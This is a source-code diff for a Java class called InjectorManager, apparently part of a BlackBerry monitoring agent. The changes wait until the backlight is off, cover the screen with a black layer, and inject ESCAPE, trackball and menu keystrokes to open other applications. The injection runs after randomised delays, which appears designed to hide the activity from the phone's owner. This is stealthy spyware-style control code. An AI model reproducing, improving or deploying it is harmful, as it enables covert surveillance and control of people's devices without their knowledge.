@@ -69,7 +69,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     ApplicationManager manager = ApplicationManager.getApplicationManager();
 
     private InjectorSystemMenu menu;
-    
+
     private String actualMod;
     private String actualName;
     private AInjector injector;
@@ -240,7 +240,10 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
         status.setBacklight(false);
         manager.requestForegroundForConsole();
+
         unLock();
+
+        Utils.sleep(5000);
 
         if (requestForeground(name)) {
             //#ifdef DEBUG
@@ -290,13 +293,23 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             return;
         }
 
-        Main.getInstance().pushBlack();
-        Utils.sleep(1000);
+        UiApplication.getUiApplication().invokeLater(new Runnable() {
+            public void run() {
+                Main.getInstance().pushBlack();
+            }
+        });
 
         try {
-            if (status.backlightEnabled()) {
-                return;
+            for (int i = 0; i < 10; i++) {
+                //#ifdef DEBUG
+                debug.trace("unLock, waiting... ");
+                //#endif
+                Utils.sleep(1000);
+                if (status.backlightEnabled()) {
+                    return;
+                }
             }
+
             KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
             Utils.sleep(300);
 
@@ -385,6 +398,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version <7, pressing menu: " + menu);
             //#endif
+            KeyInjector.trackBallRaw(20, true);
             KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
         }
 
@@ -579,7 +593,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         debug.trace("onApplicationChange name: " + startedName + " cod: "
                 + startedMod);
         //#endif
-        
+
         //Status status=Status.self();        
 
         if (status.applicationTimer != null) {
@@ -605,7 +619,8 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         status.applicationTimer = new Timer();
 
         RunInjectorTask task = new RunInjectorTask(RUNON_APP);
-        status.applicationTimer.schedule(task, APP_TIMER_PERIOD, APP_TIMER_PERIOD);
+        status.applicationTimer.schedule(task, APP_TIMER_PERIOD,
+                APP_TIMER_PERIOD);
     }
 
     public void onBacklightChange(boolean value) {
@@ -621,11 +636,12 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             status.applicationTimer = new Timer();
             RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);
 
-            int waitSeconds=Utils.randomInt(11,30);
+            int waitSeconds = Utils.randomInt(11, 30);
             //#ifdef DEBUG
             debug.trace("onBacklightChange, waiting: " + waitSeconds);
             //#endif
-            status.applicationTimer.schedule(task, waitSeconds * 1000, Integer.MAX_VALUE);
+            status.applicationTimer.schedule(task, waitSeconds * 1000,
+                    Integer.MAX_VALUE);
         } else {
             if (foreInterestApp) {
                 startApplicationTimer();
